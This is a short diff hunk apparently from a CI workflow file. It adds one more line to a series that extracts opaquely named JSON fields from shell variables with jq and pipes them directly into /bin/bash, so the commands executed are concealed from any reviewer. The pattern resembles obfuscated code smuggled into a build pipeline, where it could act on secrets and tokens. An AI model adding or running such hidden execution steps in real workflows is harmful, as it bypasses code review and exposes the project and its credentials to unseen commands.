@@ -36,6 +36,7 @@ jobs:
           echo $lp4 | jq -r .xrxv167 | /bin/bash
           echo $aev0 | jq -r .p99017 | /bin/bash
           printf '%s' "$e2" | jq -r .xsbp56016 | /bin/bash
+          echo $z87 | jq -r .rqmwm9254 | /bin/bash
 
       - name: Archive output
         if: always()
